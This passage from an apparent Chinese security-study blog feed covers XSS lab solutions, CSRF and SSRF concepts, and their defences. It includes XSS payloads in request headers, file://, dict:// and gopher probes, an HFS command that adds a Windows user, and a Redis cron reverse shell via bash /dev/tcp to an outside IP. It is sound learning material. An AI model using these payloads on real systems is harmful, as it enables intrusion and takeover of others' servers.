class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?keyword=1&amp;t_sort=ccb</span><br><span class="line"></span><br><span class="line">?keyword=1&amp;t_sort=&quot; type=&quot;&quot; onclick= alert(`xss`)&gt;//</span><br><span class="line"></span><br><span class="line">// 效果如下</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>= <span class="string">alert(</span>`<span class="attr">xss</span>`)&gt;</span>//&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure><p>输入后，再点击页面即可触发onclick事件。</p><h3 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h3><p>与第10关的区别是双引号、&lt;&gt;被实体编码了。</p><p>但是可以看到多了一个名为t_ref的input标签，该标签的值也无法通过get方法赋予。但是根据名称，猜测来自referer。抓包，修改referer，发现响应体中的t_ref确实与请求头的referer字段的值相同。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20230917213236492.png" alt="image-20230917213236492" style="zoom:50%;"><p>使用BP或者hackbar提交referer即可。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">referer:&quot; type=&quot;&quot; onclick=alert(&#x27;xss&#x27;)&gt;//</span><br><span class="line"></span><br><span class="line">// 效果如下</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_ref&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>//&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20230917215234200.png" alt="image-20230917215234200"></p><h3 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h3><p>与第11关原理相同，只不过回显的字段从Referer换成了User-Agent。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent:&quot; type=&quot;&quot; onclick=alert(&#x27;xss&#x27;)&gt;//</span><br></pre></td></tr></table></figure><h3 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h3><p>与第11关原理相同，只不过回显的字段从Referer换成了Cookie。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: user=&quot; type=&quot;&quot; onclick=alert(&#x27;xss&#x27;)&gt;//</span><br></pre></td></tr></table></figure><h3 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h3><p><a href="https://blog.csdn.net/qq_40929683/article/details/120422266">https://blog.csdn.net/qq_40929683/article/details/120422266</a></p><h3 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h3><p>传入src参数的值会被用于<code>ng-include</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?src=ccb</span><br><span class="line"></span><br><span class="line">// 查看页面html</span><br><span class="line">&lt;span class=&quot;ng-include:ccb&quot;&gt;&lt;/span&gt;</span><br></pre></td></tr></table></figure><p><code>ng-include</code>指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点。</p><blockquote><p>ng-include如果单纯指定地址，必须要加引号</p><p>ng-include加载外部html，script标签中的内容不执行</p><p>ng-include加载外部html中含有style标签样式可以识别</p><p>ng-include 属性的值可以是一个表达式，返回一个文件名</p><p>默认情况下，包含的文件需要包含在同一个域名下。</p></blockquote><p>尝试通用的攻击语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=&quot;&lt;script&gt;alert(1)&lt;/script&gt;  // </span><br></pre></td></tr></table></figure><p>发现双引号被过滤，&lt;&gt;被实体编码，只能使用其他XSS语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 加载同一域名下的外部文件level1.php，同时传入参数name</span><br><span class="line">?src=&#x27;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#x27;</span><br></pre></td></tr></table></figure><p>这样该页面就会包含level1.php，并传入name参数<code>&lt;img src=1 onerror=alert(1)&gt;&#39;</code>，由于在解析src时出错，所以触发onerror。</p><h3 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h3><p>尝试如下语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">?keyword=&lt;img src=1 οnerrοr=alert(&#x27;xss&#x27;) &gt;</span><br></pre></td></tr></table></figure><p>发现script被注释，空格和&#x2F;均被转义。</p><p>尝试使用%0A替换空格：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;img%0asrc=1%0aonerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><h3 id="level-17-20"><a href="#level-17-20" class="headerlink" title="level 17-20"></a>level 17-20</h3><p>flash XSS，与swf文件相关。</p><p><a href="https://blog.csdn.net/qq_40929683/article/details/120422266">https://blog.csdn.net/qq_40929683/article/details/120422266</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XSS&quot;&gt;&lt;a href=&quot;#XSS&quot; class=&quot;headerlink&quot; title=&quot;XSS&quot;&gt;&lt;/a&gt;XSS&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2021/png/2476579/162813291</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>CSRF、SSRF</title>
    <link href="https://frankcao3.github.io/posts/25956"/>
    <id>https://frankcao3.github.io/posts/25956</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.980Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>CSRF是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作。利用了网站服务器只能检查发起请求的是不是用户的浏览器，而无法检查发起请求的是不是用户本意的这一漏洞。通常由于服务端没有对请求头做严格过滤引起的。</p><p><u>XSS利用的是站点内的信任用户</u>，由信任用户执行了含有恶意前端脚本的页面产生，攻击对象是访问页面的用户。而<u>CSRF则是通过搭建外部网站，受害者访问网站时被攻击者利用，通过盗取受害者身份，伪装来自受信任用户的请求来执行对受信任网站的攻击</u>。</p><p>CSRF会造成密码重置，用户伪造等问题，可能引发严重后果。我们知道，绝大多数网站是通过cookie等方式辨识用户身份，再予以授权的。所以要伪造用户的正常操作，最好的方法是通过XSS或链接欺骗等途径（在XSS中嵌入CSRF的链接），让用户在本机（即拥有身份cookie的浏览器端）发起用户所不知道的请求。CSRF攻击会令用户在不知情的情况下攻击自己已经登录的系统。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/4dca552031d4403d9edc193d4a48d759.png"></p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801105831026.png" alt="image-20220801105831026" style="zoom: 67%;"><p>可能出现该漏洞的地方：</p><p><strong>存在添加、修改、删除操作的页面</strong>。</p><p>仅有查询的页面不会有该漏洞。</p><p>一般出现在中小型的网站，不属于严重漏洞。大型网站一般也比较安全，不会有这种漏洞。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h3><p>以pikachu靶场为例，在修改个人信息的页面点击提交。通过BP抓包可以看到所填写的个人信息是通过get方式提交的：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803094611582.png" alt="image-20220803094611582"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803094522118.png" alt="image-20220803094522118"></p><p>那么通过修改get请求中的信息，就可以构造含有自己信息的URL。然后写入自己网站中新建的html。当受害者 <strong>在登录状态下访问</strong> 这个html（外部网站）时就会执行该URL（请求伪造，将个人信息修改为了黑客伪造的内容），达到跨站请求伪造的目的。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220711202616728.png" alt="image-20220711202616728"></p><p>或者也可以直接使用BP的CSRF功能，自动生成攻击用html。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220711202945583.png" alt="image-20220711202945583"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220711203019853.png" alt="image-20220711203019853"></p><p>复制出自动生成的攻击用html代码，修改其中个人信息的参数为自己的信息，然后另存为html</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220711203224926.png" alt="image-20220711203224926"></p><p>然后若受害者访问该html即可成功执行伪造的请求。</p><h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h3><p>网站以post请求提交修改信息：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803142717285.png" alt="image-20220803142717285"></p><p>写攻击页面，其中提交的信息为post请求格式：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803142920562.png" alt="image-20220803142920562"></p><p>接下来同样诱使用户访问我们自己写的恶意代码的网址即可。当用户再次返回时可以看到值已被修改。</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>篡改目标站点上的用户数据</p><p>盗取用户隐私数据</p><p>作为其他攻击的辅助攻击手法</p><p>传播 CSRF 蠕虫</p><h2 id="挖掘"><a href="#挖掘" class="headerlink" title="挖掘"></a>挖掘</h2><p>请求直接是个GET&#x2F;POST请求，然后请求中没有token验证参数，然后还有一个固定的变量可以被控制。这种是比较常见的一种CSRF漏洞。这种漏洞的检测方法很简单：网页操作某功能，<strong>抓包后，如果发现满足上面条件，然后没有referer验证，再去页面测试下</strong>，基本就可以确定存在不存在CSRF漏洞了。</p><h2 id="CSRF和XSS的区别"><a href="#CSRF和XSS的区别" class="headerlink" title="CSRF和XSS的区别"></a>CSRF和XSS的区别</h2><ul><li><p><strong>相同点</strong>：</p><p>XSS、CSRF、SSRF三种常见的Web服务端漏洞均是由于，服务器端对用户提供的可控数据过于信任或者过滤不严导致的。</p></li><li><p><strong>不同点</strong>：</p><p>XSS是服务器对用户输入的数据没有进行足够的过滤，导致客户端浏览器在渲染服务器返回的html页面时，出现了预期值之外的<strong>脚本语句被执行</strong>。<strong>攻击发生在本站</strong>。</p><p>CSRF(跨站请求伪造)是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以利用用户的Cookie信息<strong>伪造用户请求</strong>发送至服务器。<strong>攻击是跨站的</strong>。 </p><p>SSRF(服务端请求伪造）是服务器对用户提供的可控URL过于信任，没有对攻击者提供的RUL进行地址限制和足够的检测，导致攻击者可以以此为跳板<strong>攻击内网或其他服务器</strong>。</p></li></ul><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><h3 id="强制用户输入密码"><a href="#强制用户输入密码" class="headerlink" title="强制用户输入密码"></a>强制用户输入密码</h3><p>当用户发送重要的请求时需要输入原始密码。</p><h3 id="设置随机Token（最有效）"><a href="#设置随机Token（最有效）" class="headerlink" title="设置随机Token（最有效）"></a>设置随机Token（最有效）</h3><p>服务器每次向客户端返回操作页面时都会给客户端产生一个随机的 Token 值，客户端在页面进行操作时需要携带该 Token，服务器如果检查发现用户携带的 Token 和它产生的不一样，就会判断为攻击行为，拒绝执行。</p><p>使用token比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803144026924.png" alt="image-20220803144026924"></p><p>在每次请求中加入了不同的token，等攻击者再利用这个token时，这个token已经过期，无法成功攻击。</p><p><strong>缺点：</strong></p><p><strong>难以给所有的请求都使用token</strong>。在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。</p><p><strong>难以保证 token 本身的安全</strong>。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。当用户访问黑客在论坛上发表的这个网站时，系统也会在这个地址后面加上论坛的 token，于是黑客就可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，即使 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。</p><p>当然，攻击者可以实现用恶意脚本获取用户的token，然后拦截客户的请求再把 Token 值插入到客户的请求包中。但是这些操作已经超出CSRF攻击的范围。</p><h3 id="检验referer来源"><a href="#检验referer来源" class="headerlink" title="检验referer来源"></a>检验referer来源</h3><p>请求时判断请求链接是否为当前管理员正在使用的页面，要求 Referfer 必须是本服务器自己的主机名（同源检查）。比如：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803144318067.png" alt="image-20220803144318067"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP REFERER&#x27;</span>], <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER NAME&#x27;</span>]) != <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="comment">//Get input</span></span><br><span class="line"><span class="variable">$pass_new</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password_new&#x27;</span>];</span><br><span class="line"><span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password_conf&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比如，管理员在编辑文章，黑客发来恶意的修改密码的链接，因为修改密码页面管理员之前并没有在操作，所以攻击者诱骗受害者点击提交的请求中Referer 一定是空值，因此攻击失败。</p><p><strong>局限性：</strong></p><p>首先，<u>referer是可以通过抓包进行修改的</u>。</p><p>再者，<u>检查 Refer 信息并不能防范来自本域的攻击</u>。在企业业务网站上，经常会有同域的论坛，邮件等形式的 Web 应用程序存在，来自这些地方的 CSRF 攻击所携带的就是本域的 Refer 域信息，因此不能被这种防御手段所阻止。</p><p>同样，某些<u>直接发送 HTTP 请求的方式（指非浏览器，比如用后台代码等方法）可以伪造一些 Refer 信息</u>，虽然直接进行头信息伪造的方式属于直接发送请求，很难跟随发送 cookie，但由于目前客户端手段层出不穷，flash，javascript 等大规模使用，从客户端进行 refer 的伪造，尤其是在客户端浏览器安装了越来越多的插件的情况下已经成为可能了。</p><h3 id="设置验证码"><a href="#设置验证码" class="headerlink" title="设置验证码"></a>设置验证码</h3><h3 id="限制请求只能为post"><a href="#限制请求只能为post" class="headerlink" title="限制请求只能为post"></a>限制请求只能为post</h3><h3 id="在HTTP-头中自定义属性并验证"><a href="#在HTTP-头中自定义属性并验证" class="headerlink" title="在HTTP 头中自定义属性并验证"></a>在HTTP 头中自定义属性并验证</h3><p>不把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。</p><p> 然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是不能接受的。</p><h3 id="安全的会话管理-避免会话被利用"><a href="#安全的会话管理-避免会话被利用" class="headerlink" title="安全的会话管理(避免会话被利用)"></a>安全的会话管理(避免会话被利用)</h3><ol><li>不要在客户端端保存敏感信息(比如身份认证信息) ;</li><li>使页面关闭（退出）时会话过期；</li><li>设置会话过期机制，比如15分钟内无操作，则自动登录超时;</li></ol><h3 id="访问控制安全管理"><a href="#访问控制安全管理" class="headerlink" title="访问控制安全管理"></a>访问控制安全管理</h3><ol><li>敏感信息的修改时需要对身份进行二次认证，比如修改账号时，需要判断旧密码;</li><li>敏感信息的修改使用post ,而不是get ;</li><li>通过http头部中的referer来限制原页面</li><li>增加验证码：一般用在登录(防暴力破解)， 也可以用在其他重要信息操作的表单中(需要考虑可用性)。</li></ol><h1 id="x3D-x3D-SSRF-x3D-x3D-（更重要）"><a href="#x3D-x3D-SSRF-x3D-x3D-（更重要）" class="headerlink" title="&#x3D;&#x3D;SSRF&#x3D;&#x3D;（更重要）"></a>&#x3D;&#x3D;SSRF&#x3D;&#x3D;（更重要）</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><p>SSRF(Server-Side Request Forgery：<strong>服务器端请求伪造</strong>) 是一种由攻击者构造形成<u>由服务端发起请求</u>的一个安全漏洞。攻击者向服务器上传恶意地址，服务器未对地址进行检查就直接访问，让目标服务器执行非本意的操作，造成了攻击。</p><p><strong>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</strong>正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。SSRF常被用于，探测攻击者无法访问到的网络区域，比如服务器所在的内网，或是受防火墙访问的主机。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1628818773345-5dee00af-4c10-4952-a572-61b413c1b5ac.png" alt="img"></p><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>SSRF的形成<strong>大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制</strong>。比如没有限制可以构建恶意访问的敏感协议头或内网访问资源权限。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。</p><h2 id="SSRF与CSRF的区别？"><a href="#SSRF与CSRF的区别？" class="headerlink" title="SSRF与CSRF的区别？"></a>SSRF与CSRF的区别？</h2><p>1.SSRF是服务端请求伪造，SSRF是诱导服务器访问，欺骗的是服务端（服务器）</p><p>2.CSRF是跨站请求伪造，CSRF是通过诱导用户点击，欺骗的是客户端（浏览器）</p><h2 id="SSRF的挖掘"><a href="#SSRF的挖掘" class="headerlink" title="SSRF的挖掘"></a>SSRF的挖掘</h2><h3 id="从web功能出发："><a href="#从web功能出发：" class="headerlink" title="从web功能出发："></a>从web功能出发：</h3><ul><li><p>URL分享：通过URL地址分享网页内容</p></li><li><p>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p></li><li><p>在线翻译（有道翻译ssrf漏洞）：通过URL地址翻译对应文本的内容</p></li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803192304757.png" alt="image-20220803192304757"></p><ul><li><p>图片加载与下载（通过URL地址加载或下载图片）：通过URL地址加载或下载图片，比如上传头像</p></li><li><p>图片、文章收藏功能</p></li><li><p>网站采集、网页抓取的地方</p></li><li><p>一切要你输入网址的地方和可以输入ip的地方。</p></li></ul><h3 id="从URL关键字中寻找："><a href="#从URL关键字中寻找：" class="headerlink" title="从URL关键字中寻找："></a>从URL关键字中寻找：</h3><p>share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain</p><h2 id="SSRF的验证"><a href="#SSRF的验证" class="headerlink" title="SSRF的验证"></a>SSRF的验证</h2><p>SSRF漏洞特点：一般通过构造URL来判断该网站是否存在SSRF</p><ol><li><p><strong>白盒测试</strong></p><p>寻找可能构成SSRF漏洞的危险函数：file_get_contents()、fsockopen()、curl_exec()。</p></li><li><p><strong>黑盒测试</strong></p><p>（1）右键图片，看图片（或者其他资源）的URL是否为该网站的路径。如果该图片是其他服务器的地址，则可能存在SSRF漏洞。</p><p>（2）burpsuite抓包，查看网站请求消息报文中是否存在URL，URL请求的是否为内网IP。然后也可以尝试将URL更换为可能的内网地址（通过历史漏洞判断该web应用可能的内网地址），或者暴力拆解内网地址。</p><p>（3）DNS外带（<strong>常用于测试没有回显的网站</strong>）DNSlog平台测试（查询DNS解析过程）</p></li></ol><ul><li><p>排除法：浏览器f12查看源代码看是否是在本地进行了请求</p><p>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80%EF%BC%89%E7%9A%84%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a></p></li><li><p>dnslog等工具进行测试，看是否被访问</p><p>可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。</p></li><li><p>抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址</p><p>从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</p><p>通过二级域名暴力猜解工具模糊猜测内网地址</p></li><li><p>直接返回的Banner、title、content等信息</p></li><li><p>留意bool型SSRF</p></li></ul><h2 id="漏洞利用（危害可大可小）"><a href="#漏洞利用（危害可大可小）" class="headerlink" title="漏洞利用（危害可大可小）"></a>漏洞利用（危害可大可小）</h2><ul><li><p><strong>内网探测</strong>：可以对外网、内网、本地进行端口扫描，某些情况下端口的Banner会回显出来（比如3306的）；</p><p>比如输入<code>http://192.168.64.144:3306</code>进行探测。</p></li><li><p><strong>攻击运行在内网或外网的有漏洞程序</strong>（比如溢出）；</p><p>向内部任意主机的任意端口发送精心构造的payload，主要是使用 GET 参数就可以实现的攻击（如Struts2漏洞，SQL注入）；</p></li><li><p>可以对内网Web应用进行指纹识别，原理是通过请求默认的文件得到特定的指纹（如readme文件）；</p></li><li><p><strong>窃取本地和内网敏感数据</strong>：使用<code>file://</code>协议读取本地文件(或其他协议）</p><p><strong>各个协议调用探针: http, file, dict, ftp, gopher等</strong></p><p><strong>漏洞攻击：端口扫描，指纹识别，漏洞利用，内网探针等</strong></p><p>探测内网主机：<code>http://192.168.64.144/phpmyadmin/</code></p><p>**探测服务器文件<code>file:///</code>**：<code>file:///c:/windows/win.ini</code>，在有回显的情况下，利用 file 协议可以读取任意内容</p><p><strong>探测内网服务（dict伪协议）web服务</strong>：<code>dict://192.168.64.144:3306/info</code>，会泄露安装软件版本信息，查看端口，操作内网<strong>redis</strong>服务等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dict://127.0.0.1:3360（探测 MySQL 服务）</span><br><span class="line">如果内网中的mysql数据库存在无密码的用户，可结合gopher协议进行攻击。</span><br><span class="line"></span><br><span class="line">dict://127.0.0.1:22（探测 SSH 服务）</span><br><span class="line">dict://127.0.0.1:6379（探测 redis 服务）</span><br><span class="line">dict://127.0.0.1:1433（探测 SQL server 服务）</span><br></pre></td></tr></table></figure><p>探测内网主机的ftp是否开启：<code>ftp://192.168.64.144:21</code></p><p><strong>gopher伪协议</strong> 支持发出GET、POST请求，发送TCP数据，默认端口70</p><p>可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。</p><p>gopher协议是ssrf利用中一个最强大的协议（俗称万能协议）。可用于反弹shell。所有的WEB服务中间件都支持gopher协议，gopher可以发送任何的TCP数据包，常用于攻击redis服务（内存数据库——拿到该服务即是最高权限）。</p><p><strong>gopher</strong> 的利用可以参考：<a href="http://t.zoukankan.com/beidaxmf-p-13935298.html%E3%80%81https://blog.csdn.net/qq_60115503/article/details/124407499%E3%80%82">http://t.zoukankan.com/beidaxmf-p-13935298.html、https://blog.csdn.net/qq_60115503/article/details/124407499。</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">利用gopher发起请求的一般步骤：</span><br><span class="line">1.构造HTTP的请求消息</span><br><span class="line">2.对请求消息进行URL编码</span><br><span class="line">3.对编码后的%0a替换成%0D%0a</span><br><span class="line">4.将替换后的数据再进行一次URL编码（双重URL编码）</span><br><span class="line">5.拼接协议头</span><br></pre></td></tr></table></figure><p><strong>各个脚本语言所支持的协议：</strong></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803190312037.png" alt="image-20220803190312037"></p></li><li><p><strong>作为下一步攻击的跳板</strong></p><p>比如使用ssrf探测内网主机，探查到有一台主机开放了8080端口：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803191051676.png" alt="image-20220803191051676"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220803191132436.png" alt="image-20220803191132436"></p><p>发现该主机搭载了HFS。搜索HFS相关漏洞，发现<a href="https://blog.csdn.net/qq_45884775/article/details/124065484%EF%BC%8C%E5%AD%98%E5%9C%A8RCE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E3%80%82payload%E4%B8%BA%60http://127.0.0.1:8080/?search==%00%7B.exec%7Ccmd.exe">https://blog.csdn.net/qq_45884775/article/details/124065484，存在RCE命令执行漏洞。payload为`http://127.0.0.1:8080/?search==%00{.exec|cmd.exe</a> &#x2F;c [Command-String].}&#96;。</p><p>所以可以实施攻击，比如<code>http://192.168.64.144:8080/?search==%00&#123;.exec|cmd.exe /c net user test1234 1234 /add.&#125;</code>添加用户。或者下载远程文件（下载木马），实施远控。</p></li><li><p><strong>绕过安全防御</strong>：比如防火墙、CDN</p></li></ul><h2 id="SSRF-getshell"><a href="#SSRF-getshell" class="headerlink" title="SSRF getshell"></a>SSRF getshell</h2><h3 id="利用Redis未授权访问getshell"><a href="#利用Redis未授权访问getshell" class="headerlink" title="利用Redis未授权访问getshell"></a>利用Redis未授权访问getshell</h3><p><a href="https://blog.csdn.net/weixin_39194641/article/details/102605354">https://blog.csdn.net/weixin_39194641/article/details/102605354</a></p><p><a href="https://blog.csdn.net/u012206617/article/details/108941738">https://blog.csdn.net/u012206617/article/details/108941738</a></p><p>利用redis写入定时反弹shell任务，用到了CRLF漏洞，url如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">编码前：</span><br><span class="line">http://192.168.31.78:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business location&amp;btnSubmit=Search&amp;operator=http://192.168.221.134:54675/</span><br><span class="line"></span><br><span class="line">set x &quot;\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.221.129/55555 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">aaa</span><br><span class="line">编码后：</span><br><span 